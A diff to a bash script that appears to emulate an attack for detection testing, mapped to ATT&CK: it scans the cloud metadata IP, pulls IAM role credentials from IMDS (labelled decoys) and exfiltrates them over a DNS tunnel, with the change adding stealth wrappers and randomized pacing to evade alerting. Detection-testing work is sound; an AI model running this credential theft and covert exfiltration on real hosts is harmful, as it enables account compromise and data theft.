@@ -18,6 +18,7 @@
 # ATT&CK technique it maps to.
 # ---------------------------------------------------------------------------
 set -u
+source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"
 
 METADATA_IP="${METADATA_IP:-169.254.169.254}"
 EXFIL_DOMAIN="${EXFIL_DOMAIN:-exfil.internal}"
@@ -45,15 +46,17 @@ say "metadata=$METADATA_IP exfil-domain=$EXFIL_DOMAIN dns-sink=$DNS_SINK"
 
 # --- Step 1: Discovery -----------------------------------------------------
 step "Step 1: Discovery — nmap scan of metadata IP (ATT&CK T1046)"
-nmap -Pn -n -p 80,443,8080 --reason "$METADATA_IP" 2>&1 | tee -a "$LOG"
+st_mark T1046 "scan-imds"
+st_scan "$METADATA_IP" 80,443,8080 | tee -a "$LOG"
 
 # --- Step 2: Credential access --------------------------------------------
 step "Step 2: Credential access — query IMDS (ATT&CK T1552.005)"
 ROLE_URL="http://${METADATA_IP}/latest/meta-data/iam/security-credentials"
-ROLE="$(curl -s --max-time 5 "$ROLE_URL/" | head -n1)"
+st_mark T1552.005 "imds-query"
+ROLE="$(st_http GET "$ROLE_URL/" | head -n1)"
 say "discovered IAM role (decoy): ${ROLE:-<none>}"
 RAW="${RESULTS_DIR}/creds_${SESSION}.json"
-curl -s --max-time 5 "${ROLE_URL}/${ROLE}" -o "$RAW"
+st_http GET "${ROLE_URL}/${ROLE}" "" "" "$RAW"
 say "retrieved decoy credential blob -> $RAW ($(wc -c < "$RAW" 2>/dev/null || echo 0) bytes)"
 
 if [ ! -s "$RAW" ]; then
@@ -70,8 +73,10 @@ say "encoded payload length: ${#B64} chars"
 step "Step 4: Exfiltration — DNS tunnel to sink (ATT&CK T1048.003)"
 SINK_IP="$(resolve_sink)" || { say "!! cannot resolve DNS sink $DNS_SINK — is dns-sink running? aborting."; exit 1; }
 say "using DNS sink @ $SINK_IP"
-# DNS labels max 63 chars; keep well under and split into one label per query.
-CHUNK=48
+# DNS labels max 63 chars; label length and pacing come from the stealth profile.
+CHUNK="$ST_DNS_LABEL"
+say "$(st_banner) label=${CHUNK}"
+st_mark T1048.003 "dns-exfil-start"
 seq=0
 for ((i=0; i<${#B64}; i+=CHUNK)); do
     label="${B64:i:CHUNK}"
@@ -80,7 +85,9 @@ for ((i=0; i<${#B64}; i+=CHUNK)); do
         && say "  exfil seq=$seq ($label)" \
         || say "  exfil seq=$seq FAILED ($qname)"
     seq=$((seq+1))
+    if [ "$ST_DNS_DELAY_MAX" -gt 0 ]; then st_sleep "$ST_DNS_DELAY_MIN" "$ST_DNS_DELAY_MAX" >/dev/null; fi
 done
+st_mark T1048.003 "dns-exfil-done"
 
 step "Done — ${seq} DNS exfil queries sent. Review EDR/alerting telemetry."
 say "artifacts: $LOG  $RAW  (decoded copy appears in sink's results as exfil_${SESSION}.decoded)"
